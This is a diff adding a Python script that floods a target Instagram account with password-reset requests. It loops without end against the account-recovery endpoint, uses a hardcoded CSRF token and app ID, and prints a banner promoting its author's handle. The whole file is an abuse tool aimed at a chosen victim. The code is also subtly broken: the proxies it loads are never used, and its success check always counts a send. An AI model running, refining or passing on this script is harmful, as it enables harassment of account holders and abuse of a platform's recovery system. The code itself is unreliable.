@@ -1,0 +1,51 @@
+# Rest-instagram
+#Rest instagram use proxy
+#سوي لك ملف اسمه P وحط فيه البروكسيات 
+import requests
+import random
+print("""
+  _____   _____  __      __  _______ 
+ / ____| |_   _| \ \    / / |__   __|
+| |  __    | |    \ \  / /     | |   
+| | |_ |   | |     \ \/ /      | |   
+| |__| |  _| |_     \  /       | |   
+ \_____| |_____|     \/        |_|   
+ <!!> Follow me in instagram @givt_ops""")
+print("-----------------------------------")
+Target = input('Enter Target:')
+a = 0
+def rest():
+    global a
+    p = []
+    for i in open("p.txt", "r").read().splitlines():
+        p.append(i)
+    newproxy = {
+        'http': 'http://{}'.format(p),
+        'https': 'https://{}'.format(p)}
+    try:
+        proxy = str(random.choice(p))
+        url = "https://www.instagram.com/accounts/account_recovery_send_ajax/"
+        headers = {
+            "accept": "*/*",
+            "accept-encoding": "gzip,deflate,br",
+            "accept-language": "ar,en-US;q=0.9,en;q=0.8",
+            "content-length": "49",
+            "content-type": "application/x-www-form-urlencoded",
+            "origin": "https://www.instagram.com",
+            "referer": "https://www.instagram.com/accounts/password/reset/",
+            "user-agent": "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
+            "x-csrftoken": "j4u26vxxC6D7eE63HhBde0ahZeN4mVfK",
+            "x-ig-app-id": "936619743392459"
+        }
+        data = {"email_or_username": Target, "recaptcha_challenge_field": ""}
+        while True:
+            proxy = str(random.choice(p))
+            r = requests.post(url,headers=headers,data=data,timeout=5)
+            if r.text.find("email_or_sms_sent"):
+                a +=1
+                print("Done Send:",a)
+            else:
+                pass
+    except Exception as e:
+        print(e)
+rest()
